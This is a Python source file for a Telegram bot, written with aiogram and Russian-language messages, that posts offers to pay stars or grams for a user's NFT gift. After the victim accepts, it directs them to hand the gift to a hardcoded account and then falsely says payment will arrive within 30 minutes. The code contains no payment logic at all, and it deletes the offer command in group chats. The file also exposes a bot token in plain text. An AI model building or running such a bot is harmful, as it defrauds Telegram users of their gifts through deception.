import asyncio
import logging
import shlex
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
)

TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_USERNAME = "rattiixx"

CURRENCY = {"g": "💎", "s": "⭐"}

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}

# Новая инструкция без скобок
INSTRUCTION_TEXT = "Передайте подарок с помощью кнопки ниже, после чего подтвердите передачу."

def gift_name(url: str) -> str:
    slug = url.rstrip("/").rsplit("/", 1)[-1]
    if "-" in slug:
        base, num = slug.rsplit("-", 1)
        if num.isdigit():
            return f"{base} #{num}"
    return slug or "подарок"

def offer_kb(oid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
    ]])

def instruction_kb() -> InlineKeyboardMarkup:
    target_url = f"https://t.me/{TARGET_USERNAME}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", url=target_url)],
        [InlineKeyboardButton(text="✅ Подарок передан", callback_data="done")],
    ])

@dp.message(Command("offer"))
async def cmd_offer(message: Message):
    args = shlex.split(message.text.partition(" ")[2] or "")
    
    if len(args) < 3:
        return await message.answer(
            "Формат:\n"
            "<code>/offer \"https://t.me/nft/PlushPepe-2687\" \"20\" g</code>\n\n"
            "g — грам 💎, s — звёзды ⭐"
        )

    url, raw_sum, cur_key = args[0], args[1], args[2].lower()
    
    # Обязательная проверка на ссылку NFT
    if not url.startswith("https://t.me/nft/"):
        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок (начинаться с https://t.me/nft/).")
        
    if cur_key not in CURRENCY:
        return await message.answer("Валюта только <b>g</b> или <b>s</b>.")
        
    if not raw_sum.isdigit():
        return await message.answer("Сумма — целое число.")

    oid = uuid.uuid4().hex[:12]
    OFFERS[oid] = {"url": url, "sum": raw_sum, "cur": CURRENCY[cur_key]}

    who = message.from_user.first_name or "Пользователь"
    
    # ВАЖНО: Ссылка должна идти отдельным сообщением или с новой строки, чтобы Telegram её распознал
    caption = (
        f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок:\n\n"
        f"{url}" # Ссылка на отдельной строке
    )

    # Отправляем сообщение с принудительным превью ссылки
    await message.answer(
        text=caption, 
        reply_markup=offer_kb(oid),
        link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True)
    )

    # Моментальное удаление сообщения с командой
    if message.chat.type != "private":
        try:
            await message.delete()
        except Exception:
            pass

@dp.callback_query(F.data.startswith("dec:"))
async def on_decline(call: CallbackQuery):
    OFFERS.pop(call.data.split(":")[1], None)
    await call.message.edit_text(text="Вы отклонили предложение.", reply_markup=None)
    await call.answer("Отклонено")

@dp.callback_query(F.data.startswith("acc:"))
async def on_accept(call: CallbackQuery):
    oid = call.data.split(":")[1]
    data = OFFERS.get(oid)
    if not data:
        return await call.answer("Оффер устарел", show_alert=True)

    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(INSTRUCTION_TEXT, reply_markup=instruction_kb())
    await call.answer()

@dp.callback_query(F.data == "done")
async def on_done(call: CallbackQuery):
    await call.message.edit_text(
        "Подарок передан✅\n\n"
        "Проверяем подарок. Звёзды зачислятся в течение 30 минут."
    )
    await call.answer("Проверяем")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
